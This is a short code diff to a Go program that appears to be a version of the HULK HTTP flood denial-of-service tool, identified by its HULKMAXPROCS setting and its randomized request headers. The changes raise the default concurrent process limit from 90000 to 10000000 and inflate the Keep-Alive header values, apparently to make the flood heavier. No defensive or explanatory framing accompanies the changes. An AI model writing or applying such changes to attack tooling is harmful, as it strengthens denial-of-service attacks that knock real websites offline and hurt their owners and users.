@@ -94,7 +94,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 90000
+		maxproc = 10000000
 	}
 
 	u, err := url.Parse(site)
@@ -192,7 +192,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
 		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
-		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)+10000))
+		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000000)+10000000))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 
